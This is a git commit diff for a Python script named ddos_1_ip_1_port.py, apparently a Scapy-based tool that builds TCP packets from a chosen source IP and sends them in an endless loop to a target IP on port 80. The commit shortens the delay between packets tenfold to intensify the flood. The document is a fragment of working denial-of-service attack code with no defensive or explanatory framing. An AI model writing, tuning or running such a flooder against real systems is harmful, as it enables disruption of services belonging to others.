de09eae7f494acad1a2df8cba0b798f31b2570d4
tuannq <tuannq@vcs>
2022-09-22 04:12:58 -0400

    update

--- ddos_1_ip_1_port.py
+++ ddos_1_ip_1_port.py
@@ -8,7 +8,7 @@ while True:
    IP1 = IP(src = source_IP, dst = target_IP)
    TCP1 = TCP(sport = source_port, dport = 80)
    pkt = IP1 / TCP1
-   send(pkt, inter = .001)
+   send(pkt, inter = .0001)
    
    print ("packet sent ", i)
    i = i + 1
